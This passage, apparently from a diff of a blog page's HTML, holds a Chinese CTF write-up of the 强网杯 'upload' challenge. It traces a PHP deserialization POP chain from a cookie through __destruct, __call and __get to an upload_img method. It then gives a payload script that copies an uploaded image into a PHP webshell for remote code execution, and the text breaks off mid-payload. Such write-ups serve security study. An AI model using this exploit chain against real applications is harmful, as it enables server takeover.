class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        @chdir(<span class="hljs-string">&quot;../public/upload&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-keyword">$this</span>-&gt;upload_menu))&#123;<br>            @mkdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>        &#125;<br>        @chdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;checker)&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;checker-&gt;login_check())&#123;<br>                <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filename=md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);<br>                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$user_info</span>=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;find();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$user_info</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;img)&#123;<br>            <span class="hljs-keyword">if</span>(db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;ID&#x27;</span>,<span class="hljs-variable">$user_info</span>[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;data([<span class="hljs-string">&quot;img&quot;</span>=&gt;addslashes(<span class="hljs-keyword">$this</span>-&gt;img)])-&gt;update())&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;update_cookie();<br>                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;Upload img successful!&#x27;</span>, url(<span class="hljs-string">&#x27;../home&#x27;</span>));<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Upload file failed!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_cookie</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;img&#x27;</span>]=<span class="hljs-keyword">$this</span>-&gt;img;<br>        cookie(<span class="hljs-string">&quot;user&quot;</span>,base64_encode(serialize(<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile)),<span class="hljs-number">3600</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ext_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$ext_arr</span>=explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">$this</span>-&gt;ext=end(<span class="hljs-variable">$ext_arr</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext==<span class="hljs-string">&quot;png&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>一个大类，重点关注upload_img方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;checker)&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;checker-&gt;login_check())&#123;<br>                <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filename=md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);<br>                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>第二个判断，名字从$_FILE全局变量中取出，并且把后缀加上png，这里其实存在一个漏洞，如果不通过上传文件的接口去调用该方法，那么$FILES变量就为空，那么文件名就可控喽，那在下面就可以通过copy方法去生成文件，进而rce</p>
 <p>那么究竟如何调用upload_img方法呢?一般这种考点就是反序列化了</p>
 <p>先找反序列化入口，在index.php中有一反序列化点，且参数可控</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$profile</span>=cookie(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$profile</span>))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode(<span class="variable">$profile</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$profile</span>=cookie(<span class="hljs-string">&#x27;user&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$profile</span>))&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;profile=unserialize(base64_decode(<span class="hljs-variable">$profile</span>));<br>        <span class="hljs-keyword">$this</span>-&gt;profile_db=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,intval(<span class="hljs-keyword">$this</span>-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>]))-&gt;find();<br>        <span class="hljs-keyword">if</span>(array_diff(<span class="hljs-keyword">$this</span>-&gt;profile_db,<span class="hljs-keyword">$this</span>-&gt;profile)==<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 
 
 <p>下面回到Profile.php中，一般反序列化就是要找魔术方法，这个profile类里面没有wakeup或者destruct方法，那就得通过其他类去调用他。</p>
 <p>他存在一个call方法，其中两个参数可控，所以就能调用upload_img方法了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>下面去寻找其他类中的destruct或者wakeup方法，可以看到在regeister类里面有一个destruct方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;registed)&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;index();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>如果把checker赋值为profile类，而profile类中不存在index方法，那么就会调用call方法，而call方法进而get方法再进而调用</p>
 <p>upload_img方法，完成pop链构造</p>
 <p>这里着重讲下__call方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestCall</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$param</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$method</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      var_dump(<span class="variable">$param</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;call the call!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> TestCall();</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span>-&gt;air(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestCall</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$param</span></span>)</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$method</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>      var_dump(<span class="hljs-variable">$param</span>);<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;call the call!&quot;</span>;<br>  &#125;<br>&#125;<br><br><br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> TestCall();<br><br><span class="hljs-variable">$test</span>-&gt;air(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><br></code></pre></td></tr></table></figure>
 
 <p>输出结果为</p>
-<p><img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010150041995.png"></p>
+<p><img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010150041995.png" srcset="/img/loading.gif" lazyload></p>
 <p>可见call方法第一个参数为所调用方法的名称，第二个为传入的参数，，而且以数组的形式储存</p>
 <p>弄清楚这个，就知道__call方法是如何调用 get方法了，首先是传入name，变成了  </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;index&#125;&#125;(<span class="variable">$arguments</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;index&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br></code></pre></td></tr></table></figure>
 
 <p>先计算花括号里面的值，调用了get方法，取到了我们存在数组里的upload_image方法然后变成了了 upload_image() 最后进行调用</p>
 <p>payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span> =<span class="number">0</span>;<span class="comment">//目的是过destruct里的if;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span> =<span class="number">0</span> ;<span class="comment">//目的是绕过index类的检查，防止退出程序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;./upload/ea6cf191dc7eec7b0e43199e459204e5/fb5c81ed3a220004b71069645f112867.png&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;upload/air.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;<span class="comment">//目的是过if来调用复制webshell</span></span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&quot;index&quot;</span>=&gt;<span class="string">&quot;upload_img&quot;</span>);<span class="comment">//目的是通过__get()魔术方法调用upload_Img函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Register();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker = <span class="keyword">new</span> Profile();<span class="comment">//目的是调用POP链</span></span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;checker=<span class="number">0</span>;<span class="comment">//调用pop链防止退出程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> 